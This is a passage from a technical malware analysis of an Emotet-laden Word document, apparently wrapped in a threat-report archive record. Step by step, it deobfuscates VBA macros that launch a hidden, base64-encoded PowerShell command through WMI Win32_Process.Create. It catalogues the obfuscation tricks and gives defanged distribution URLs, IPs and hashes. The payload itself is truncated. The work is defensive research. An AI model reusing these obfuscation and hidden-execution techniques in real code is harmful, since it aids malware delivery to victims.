Dtcqcidgf.Xrqtcysa.GroupName\nFbxpzsewrc = Split(Lbfipxywqppc + CVar(Trim(sss)), \"=mmuusns=\")\n  For Xuoefdntvn = rgfasd To Nryjsvnnf\n     ewr = dsf - CVar(er * 23)\n           Oljrnvdantlb = CSng(Kxdwkarxygf)\n      Yghnhozasvma = CLng(Ndkbpjuiyjru)\n      Next\n   If er > Rndlkaet Then\n     gggs = Sin(3)\n           Enpprbqwm = Uneqtaqh\n      Mgvifsapxntxe = CByte(8 - CSng(3))\nEnd If\n   If sdf > Teqxtvha Then\n     wer3 = Sin(1)\n           Zyvranmikrgug = Qgoukwihn\n      Ajeaefwlgueyx = CByte(234 - CSng(3))\nEnd If\nFor Pugvzxdpc = rgfasd To Foaqrirdncdk\n     ewr = dsf - CDbl(er * 23)\n           Xvfnlhqv = CSng(Oasaywucl)\n      Hlpcwhtm = CLng(Ktubcxbrhc)\n      Next\nYsjchbkkg = Join(Fbxpzsewrc, \"\")\n  For Chxepiwrcoy = rgfasd To Gtrbjtbf\n     ewr = dsf - CVar(er * 23)\n           Wwmmkduoffan = CSng(Nululwsldkurb)\n      Tblkmahcvlnh = CLng(Zctkuoohhuvd)\n      Next\n   If er > Cstbhtmepdwv Then\n     gggs = Sin(3)\n           Pixorsehaggz = Uqpiopzcsl\n      Gunqnziwr = CByte(8 - CSng(3))\nEnd If\n   If sdf > Hltnvrmuioaky Then\n     wer3 = Sin(1)\n           Gpsnqlnklkt = Hqjtvtixvbek\n      Rsfkpczstee = CByte(234 - CSng(3))\nEnd If\nFor Tahdcgtnse = rgfasd To Efqlnnckuwr\n     ewr = dsf - CDbl(er * 23)\n           Eitpxepmipwoy = CSng(Meznyvkx)\n      Fqcyqwibd = CLng(Axvascvptxply)\n      Next\nEnd Function\n\n```\n\n-----\n\n#### When we clear useless codes that are included in the macro codes to cover malicious code, we reveal the following function:\n```\n27.\nFunction Ysjchbkkg()\nJqzbdljbr = I + ChrW(wdKeyP)\nLbfipxywqppc = Jqzbdljbr + Dtcqcidgf.Iqjssfeeu + Dtcqcidgf.Zxioomrqvjz\nsss = Dtcqcidgf.Xrqtcysa.GroupName\nFbxpzsewrc = Split(Lbfipxywqppc + CVar(Trim(sss)), \"=mmuusns=\")\nYsjchbkkg = Join(Fbxpzsewrc, \"\")\nEnd Function\n\n From the Ysjchbkkg function:\n28. Ysjchbkkg = Join(Fbxpzsewrc, \"\")\nFbxpzsewrc is also defined in the function:\n29. Fbxpzsewrc = Split(Lbfipxywqppc + CVar(Trim(sss)), \"=mmuusns=\")\n\n Put 29 . in 28. :\n30. Ysjchbkkg = Join(Split(Lbfipxywqppc + CVar(Trim(sss)), \"=mmuusns=\"), \"\")\n\n We must find Lbfipxywqppc and sss to reveal Ysjchbkkg . They are included in the\nYsjchbkkg function:\n31. Lbfipxywqppc = Jqzbdljbr + Dtcqcidgf.Iqjssfeeu + Dtcqcidgf.Zxioomrqvjz\n32. sss = Dtcqcidgf.Xrqtcysa.GroupName\n\n Put 31 . and 32. in 30. :\n33. Ysjchbkkg = Join(Split(Jqzbdljbr + Dtcqcidgf.Iqjssfeeu + Dtcqcidgf.Zxioomrqvjz +\nCVar(Trim(Dtcqcidgf.Xrqtcysa.GroupName)), \"=mmuusns=\"), \"\")\n\n Now, we need to find Jqzbdljbr, Dtcqcidgf.Iqjssfeeu, Dtcqcidgf.Zxioomrqvjz and CVar(Trim(Dtcqcidgf.Xrqtcysa.GroupName) .\nJqzbdljbr exist in the function:\n34. Jqzbdljbr = I + ChrW(wdKeyP)\n\n We must find I and ChrW(wdKeyP) .\nI is not initialized.\n35. I = \"\"\n\n Let's find ChrW(wdKeyP) . According to wdKey enumeration :\n36. wdKeyP = 80\n\n```\n\n-----\n\n#### According to ASCII code, 80 specifies the P character. When we put 80 in place of\n```\nwdKeyP in ChrW(wdKeyP), we get:\n37. ChrW(80) = \"P\"\n\n So, ChrW(wdKeyS) is equal to the P character, but adversaries used wdKeyP and ChrW functions together instead of a simple P for obfuscation.\n\n Let's put 35. and 37. in 34.\n38. Jqzbdljbr = \"\" + \"P\"\n\n Concatenate strings:\n39. Jqzbdljbr = \"P\"\n\n Now, let's find Dtcqcidgf.Iqjssfeeu . It does not exist in the macro code, it is a form variable:\nVBA FORM Variable \"Iqjssfeeu\" IN '01856218536426646.doc' - OLE stream:\n'Macros/Dtcqcidgf'\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 'o=mmuusns=w=mmuusns=e=mmuusns=r=mmuusns=s=mmuusns=h=mmuusns=el=mmuusns=l=mmuusns=\n=mmuusns=-=mmuusns=w=mmuusns= =mmuusns=h=mmuusns=i'\n\n Therefore:\n40.\nDtcqcidgf.Iqjssfeeu=\"o=mmuusns=w=mmuusns=e=mmuusns=r=mmuusns=s=mmuusns=h=mmuusns=el=mm\n =mmuusns=-=mmuusns=w=mmuusns= =mmuusns=h=mmuusns=i\"\nDtcqcidgf.Zxioomrqvjz is also a form variable:\nVBA FORM Variable \"b'Zxioomrqvjz'\" IN '01856218536426646.doc' - OLE stream:\n'Macros/Dtcqcidgf'\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 'd=mmuusns=d=mmuusns=e=mmuusns=n=mmuusns= =mmuusns=-=mmuusns=e=mmuusns=n '\n\n Then:\n41. Dtcqcidgf.Zxioomrqvjz =\"d=mmuusns=d=mmuusns=e=mmuusns=n=mmuusns= =mmuusns==mmuusns=e=mmuusns=n \"\n\n Now, let's find CVar(Trim(Dtcqcidgf.Xrqtcysa.GroupName) . First, we must find\nDtcqcidgf.Xrqtcysa.Groupname . Dtcqcidgf.Xrqtcysa is also a form variable:\nVBA FORM Variable \"b'Xrqtcysa'\" IN '01856218536426646.doc' - OLE stream:\n'Macros/Dtcqcidgf'\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - '0'\n\n```\n\n-----\n\n```\nDtcqcidgf.Xrqtcysa.GroupName means that GroupName property of\nDtcqcidgf.Xrqtcysa is a form variable.\n\n#### ðŸ’¡\n\n GroupName is a property of form controls, such as OptionButton.\nGroupName property of Dtcqcidgf.Xrqtcysa includes a long string:\n42. CVar(Trim(Dtcqcidgf.Xrqtcysa.GroupName)) = CVar(Trim(\"              \n............ stripped ............                        \nJABBAH=mmuusns=oAeQB0=mmuusns=AGoAaA=mmuusns=B6AGcA=mmuusns=YQB1AG=mmuusns=0AaQBn=mmuu\n............ stripped ............\"))\n\n Expand the full code of Dtcqcidgf.Xrqtcysa.GroupName\n42. CVar(Trim(Dtcqcidgf.Xrqtcysa.GroupName)) = CVar(Trim(\"              \nJABBAH=mmuusns=oAeQB0=mmuusns=AGoAaA=mmuusns=B6AGcA=mmuusns=YQB1AG=mmuusns=0AaQBn=mmuu\nDtcqcidgf.Xrqtcysa.GroupName starts with dozens of space characters. Adversaries\n\n added these space characters for obfuscation and used Trim function to get rid of them.\n\n ðŸ’¡\n\n The Trim function strips leading and trailing spaces from a string variable.\n43. CVar(Trim(Dtcqcidgf.Xrqtcysa.GroupName)) =\nCVar(\"JABBAH=mmuusns=oAeQB0=mmuusns=AGoAaA=mmuusns=B6AGcA=mmuusns=YQB1AG=mmuusns=0AaQB\n stripped ............\")\n\n In fact, CVar function is useless in this code. As you can guess, adversaries used this function for obfuscation.\n\n ðŸ’¡\n\n CVar is a type conversion function. It converts any string expression or numeric expression to a variant.\n44. CVar(Trim(Dtcqcidgf.Xrqtcysa.GroupName)) =\n\"JABBAH=mmuusns=oAeQB0=mmuusns=AGoAaA=mmuusns=B6AGcA=mmuusns=YQB1AG=mmuusns=0AaQBn=mmu\n stripped ............\"\n\n It's time to put 39., 40., 41. and 44. in 33. :\n\n```\n\n-----\n\n```\n45. Ysjchbkkg Join(Split( P +\n\"o=mmuusns=w=mmuusns=e=mmuusns=r=mmuusns=s=mmuusns=h=mmuusns=el=mmuusns=l=mmuusns=\n=mmuusns=-=mmuusns=w=mmuusns= =mmuusns=h=mmuusns=i\" +\n\"d=mmuusns=d=mmuusns=e=mmuusns=n=mmuusns= =mmuusns=-=mmuusns=e=mmuusns=n \" +\n\"JABBAH=mmuusns=oAeQB0=mmuusns=AGoAaA=mmuusns=B6AGcA=mmuusns=YQB1AG=mmuusns=0AaQBn=mmu\n................................ stripped ........................................\ns=BqAGUA=mmuusns=YwB3AG=mmuusns=EAcgBn=mmuusns=AGsAYw=mmuusns=BsACcA\"), \"=mmuusns=\"),\n\"\")\n\n#### Expand the full code of Ysjchbkkg\n45. Ysjchbkkg = Join(Split(\"P\" +\n\"o=mmuusns=w=mmuusns=e=mmuusns=r=mmuusns=s=mmuusns=h=mmuusns=el=mmuusns=l=mmuusns=\n=mmuusns=-=mmuusns=w=mmuusns= =mmuusns=h=mmuusns=i\" +\n\"d=mmuusns=d=mmuusns=e=mmuusns=n=mmuusns= =mmuusns=-=mmuusns=e=mmuusns=n \" +\n\"JABBAH=mmuusns=oAeQB0=mmuusns=AGoAaA=mmuusns=B6AGcA=mmuusns=YQB1AG=mmuusns=0AaQBn=mmu\n \"=mmuusns=\"), \"\")\n\n Get rid of + characters:\n46. Ysjchbkkg =\nJoin(Split(\"Po=mmuusns=w=mmuusns=e=mmuusns=r=mmuusns=s=mmuusns=h=mmuusns=el=mmuusns=l=\n =mmuusns=-=mmuusns=w=mmuusns=\n=mmuusns=h=mmuusns=id=mmuusns=d=mmuusns=e=mmuusns=n=mmuusns= =mmuusns==mmuusns=e=mmuusns=n\nJABBAH=mmuusns=oAeQB0=mmuusns=AGoAaA=mmuusns=B6AGcA=mmuusns=YQB1AG=mmuusns=0AaQBn=mmuu\n................................ stripped ........................................\ns=BqAGUA=mmuusns=YwB3AG=mmuusns=EAcgBn=mmuusns=AGsAYw=mmuusns=BsACcA\"), \"=mmuusns=\"),\n\"\")\n\n Split the text with =mmuusns= delimiter:\n47. Ysjchbkkg = Join((\"Po\",\"w\",\"e\",\"r\",\"s\",\"h\",\"el\",\"l\",\" \",\"-\",\"w\",\"\n\",\"h\",\"id\",\"d\",\"e\",\"n\",\" \",\"-\",\"e\",\"n\nJABBAH\",\"oAeQB0\",\"AGoAaA\",\"B6AGcA\",\"YQB1AG\",\"0AaQBn\",\"AD0AJw\",\"BOAHYA\",\"eABkAH\",\"gAZwB\n \"\",\"\"))\n\n Let's join the substrings:\n48. Ysjchbkkg = \"Powershell -w hidden -en\nJABBAHoAeQB0AGoAaAB6AGcAYQB1AG0AaQBnAD0AJwBOAHYAeABkAHgAZwBjAGMAYgBuAGcAJwA7ACQATgBuAH\n\n There is a PowerShell script in the Ysjchbkkg variable. Powershell ( MITRE ATT&CK\n\n##### T1086 ) is commonly used by attackers to perform various actions, including downloading a\n#### file and execution of a code. The -en parameter in the PowerShell script is an alias of the\n-EncodedCommand parameter.\n\n ðŸ’¡\n\n \"- EncodedCommand \" accepts a base64-encoded string version of a command.\n\n```\n\n-----\n\n#### Therefore, we must use base64 decoding to reveal the PowerShell command. We ll analyze the obfuscated PowerShell command in the second part of this technical analysis series.\n\n Now, we know the value of the Ysjchbkkg variable . Let's remember our main operation:\n```\n4. Do While Fcbxktofsye.Create(er & Ysjchbkkg, Swdtudgkjzjs, Awzttocpmk, Dzzebvtpbu)\nLoop\n\n Until now, we revealed Fcbxktofsye, er, and Ysjchbkkg variables . Now, we must find Swdtudgkjzjs, Awzttocpmk and Dzzebvtpbu variables.\nSwdtudgkjzjs is uninitialized.\n49. Swdtudgkjzjs = \"\"\nAwzttocpmk exists in the macro codes:\n50. Set Awzttocpmk = GetObject(Ybdakolbjc)\n51. Ybdakolbjc = Ixldqggmg + Dtcqcidgf.Ekrdfjzpyjnsx\n\n Let's put 51. in place of Ybdakolbjc in 50 ., we get:\n52. Set Awzttocpmk = GetObject(YIxldqggmg + Dtcqcidgf.Ekrdfjzpyjnsx)\n\n We found Dtcqcidgf.Ekrdfjzpyjnsx before:\n13. Dtcqcidgf.Ekrdfjzpyjnsx = \"P\"\n\n Let's get Ixldqggmg from the macro codes:\n53. Ixldqggmg = Dlgwrtobrxjmm + ChrW(wdKeyS) + Dtcqcidgf.Hsinculclm.Tag +\nRpkdwysvusev\n\n We need Dlgwrtobrxjmmi, ChrW(wdKeyS), Dtcqcidgf.Hsinculclm.Tag and\nRpkdwysvusev to find Ixldqggmg .\n\n We've already revealed the value of Dlgwrtobrxjmm in 22. :\n22. Dlgwrtobrxjmm = \"winmgmtS:win32_Process\"\n\n We've also revealed ChrW(wdKeyS) in 12. :\n12. ChrW(wdKeyS) = \"S\"\n\n```\n\n-----\n\n#### Let s find Dtcqcidgf.Hsinculclm.Tag . We must look at data streams in forms instead of the macro codes.\n\n ðŸ’¡\n\n Tag is a property that stores additional information about each control on the forms. The default setting is a zero-length string (\" \").\n```\nDtcqcidgf.Hsinculclm is defined in the form variables in the document:\n54. Dtcqcidgf.Hsinculclm.Tag = \"tar\"\n\n Let's find Rpkdwysvusev . According to its name, it seems that it is in the macro codes.\n55. Rpkdwysvusev = Dtcqcidgf.Fshewmvxnlq.Tag\n\n But, it is a tag property of a form variable, Dtcqcidgf.Fshewmvxnlq .\n56. Dtcqcidgf.Fshewmvxnlq.Tag = \"tu\"\n\n Therefore:\n57. Rpkdwysvusev = \"tu\"\n\n Let's put 22., 12., 54. and 57. in 53. :\n58. Ixldqggmg = \"winmgmtS:win32_Process\" + \"S\" + \"tar\" + \"tu\"\n\n Get rid of \"+\" characters:\n59. Ixldqggmg = \"winmgmtS:win32_ProcessStartu\"\n\n Now, we now Ixldqggmg . Let's put 59. and 13. in 52. :\n60. Set Awzttocpmk = GetObject(\"winmgmtS:win32_ProcessStartu\" + \"P\")\n\n Therefore:\n61. Set Awzttocpmk = GetObject(\"winmgmtS:win32_ProcessStartuP\")\n\n In the code showwindow property of Awzttocpmk is defined as False ( Hidden\nWindow, MITRE ATT&CK T1143 ):\n62. GetObject(winmgmtS:win32_processSp).showwindow = False\n\n ðŸ’¡\n\n ShowWindow function Sets the specified window's show state. The False value hides the window.\n\n Let's remember our main operation again.\n\n```\n\n-----\n\n```\n4. Do While Fcbxktofsye.Create(er & Ysjchbkkg, Swdtudgkjzjs, Awzttocpmk, Dzzebvtpbu)\nLoop\n\n#### We've found Fcbxktofsye, er, Ysjchbkkg, Swdtudgkjzjs and Awzttocpmk until now .\n\n Now, we must find Dzzebvtpbu variable, but it is uninitialized.\n63. Dzzebvtpbu = \"\"\n\n We revealed all variables. Let's remember them:\n23. Set Fcbxktofsye = GetObject(winmgmtS:win32_Process)\n25. er = \"\"\n48. Ysjchbkkg = \"Powershell -w hidden -en\nJABBAHoAeQB0AGoAaAB6AGcAYQB1AG0AaQBnAD0AJwBOAHYAeABkAHgAZwBjAGMAYgBuAGcAJwA7ACQATgBuAH\n49. Swdtudgkjzjs = \"\"\n61. Set Awzttocpmk = GetObject(\"winmgmtS:win32_ProcessStartuP\")\n\n Let's put 23., 25., 48., 49., 61., and 63. in their places in 4 :\n52. Do While GetObject(winmgmtS:win32_Process).Create(\"\" & \"Powershell -w hidden -en\nJABBAHoAeQB0AGoAaAB6AGcAYQB1AG0AaQBnAD0AJwBOAHYAeABkAHgAZwBjAGMAYgBuAGcAJwA7ACQATgBuAH\nLoop\n\n ðŸ’¡\n\n##### & operator generates a string concatenation of two expressions.\n\n#### In this Do While loop, Create method of the Win32_Process class is used.\n\n ðŸ’¡\n\n The Create WMI class method creates a new process.\n\n Syntax:\nuint32 Create(\n [in] string        CommandLine,\n [in] string        CurrentDirectory,\n [in] Win32_ProcessStartup ProcessStartupInformation,\n [out] uint32        ProcessId\n);\n\n Therefore, the first variable is the command line to execute. It is a PowerShell command in this code.\n\n```\n\n-----\n\n#### The second variable is CurrentDirectory. If this parameter is NULL as in this code, the new process will have the same path as the calling process.\n\n The third variable is ProcessStartupInformation, like winmgmtS:win32_ProcessStartuP in this example.\n\n ðŸ’¡\n\n The Win32_ProcessStartup abstract WMI class represents the startup configuration of a Windows-based process. The class is defined as a method type definition, which means that it is only used for passing information to the Create method of the Win32_Process class.\n\n The last variable is the global process identifier that can be used to identify a process.\n\n## Summary\n\n#### The purpose of this document, as the first part of the Emotet Technical Analysis Series is to demonstrate how to reveal heavily obfuscated Visual Basic macro codes in a recent Emotet malware document. Briefly, this obfuscated VBA code embedded in the Word document executes a PowerShell command using VMI.\n\n So far, adversaries used the following techniques to obfuscate VBA codes in the analyzed document:\n\n 1. Using hundreds of never-used loops, declarations, conditions, type conversions, and\n variable assignments.\n\n 1. Using empty macros.\n\n 1. Inserting many instances of a string ( =mmuusns= ) to the content of several variables.\n\n 1. ShowWindow property is set to False to hide the created process appearing on the\n user's task bar.\n\n 1. Hiding some variables in User Forms, instead of putting them in the macro codes.\n\n 1. Hiding some variables in properties of form variables such as Tag and GroupName\n properties.\n\n 1. Using Split function to split a string to its substrings by a given delimiter (\n```\n   =mmuusns= ). The delimiter is the random string used before.\n\n 1. Joining substrings to create the original string by the Join function.\n\n 1. Concatenating strings with + and & operators.\n\n```\n\n-----\n\n#### 1. Using alternating case strings like winmgmtS:win32_ProcessStartuP to bypass\n simple case-sensitive filters.\n\n 1. Using ChrW conversion and wdKey enumeration such as wdKeyS to obfuscate\n characters.\n\n 1. Using WMI to create a process instead of cmd . If WMI activity is not monitored, it is\n hard to detect creation of the malicious process. However, if WMI activity is monitored, WMI process creation gives blue teams a strong signal to investigate further since it is not something commonly seen in business processes.\n\n 1. Using uninitialized variables as the Null character.\n\n 1. Adding dozens of space characters to variables. Then, the Trim function is used to\n strip leading and trailing strings. 2. Using useless functions, such as the CVar type conversion function.\n\n We will analyze and reveal behaviors of the PowerShell command in the second part of this Emotet Technical Analysis series.\n\n### MITREâ€™s ATT&CK Techniques Observed\n\n#### Initial Access Execution Defense Evasion\n\n\n#### T1192 Spearphishing Link\n\n T1193 Spearphishing Attachment\n\n\n#### T1059 Command-Line Interface\n\n\n#### T1086 PowerShell T1143 Hidden Windows\n\n T1064 Scripting T1064 Scripting\n\n T1204 User Execution\n\n T1047 Windows Management Instrumentation\n\n\n#### T1140 Deobfuscate/Decode Files or Information\n\n\n## Indicator of Compromises (IoCs)\n\n### Delivery Documents\n```\nFF76FF1440947E3DD42578F534B91FDB8229C1F40FED36A3DD5688DBC51F0014\n\n Emotet Executables\ncb463bc2cfbe95d234afc0d3708babb85c7e29089d3691ab0ba6695eeeccb60f\n\n```\n\n-----\n\n### Domains (serves delivery documents)\n```\nahc.mrbdev.com\nalokhoa.vn \nhonamcharity.ir \nlvita.co \nselloderaza.cl\n\n Domains (serves Emotet executables)\n5kmtechnologies.com\ne-twow.be\nqwqoo.com\nmagnificentpakistan.com\nsiwakuposo.com\nyesimsatirli.com\n\n URLs (serves delivery documents)\nhxxps://alokhoa.vn/wp-content/uploads/lm/1-91751097-8408196-fcan6yhfsu-gg5ak/\nhxxp://honamcharity.ir/mmth4/Documentation/gepvh74lcq7h/\nhxxp://lvita.co/tmp/Reporting/\nhxxp://www.selloderaza.cl/wp-snapshots/balance/e2o6-62079720-0865-srgnquu24oppcdh20p/\n\n URLs (serves Emotet executables)\nhxxp://ahc.mrbdev.com/wp-admin/qp0/\nhxxp://e-twow.be/verde/in6k/\nhxxps://humana.5kmtechnologies.com/wp-includes/KdR9xbBq1/\nhxxps://magnificentpakistan.com/wp-includes/ha5j0b1/\nhxxps://www.qwqoo.com/homldw/3piyy4/\nhxxp://siwakuposo.com/siwaku2/X5zB0ey/\nhxxp://yesimsatirli.com/baby/HsWjaCfoR/\n\n IPs (serves delivery documents)\n45.117.169.96\n149.129.92.191\n158.58.186.204\n186.64.116.35\n\n IPs (serves Emotet executables)\n83.150.215.163\n111.90.144.211\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-01-30 - Emotet Technical Analysis - Part 1 Reveal the Evil Code.pdf"
    ],
    "report_names": [
        "2020-01-30 - Emotet Technical Analysis - Part 1 Reveal the Evil Code.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536000,
    "ts_updated_at": 1743041128,
    "ts_creation_date": 1653820701,
    "ts_modification_date": 1653820701,
    "files": {
        "pdf": "https://archive.orkl.eu/3d9053a27534ce814e0a41be6d07661cf0247ba7.pdf",
        "text": "https://archive.orkl.eu/3d9053a27534ce814e0a41be6d07661cf0247ba7.txt",
        "img": "https://archive.orkl.eu/3d9053a27534ce814e0a41be6d07661cf0247ba7.jpg"
    }
}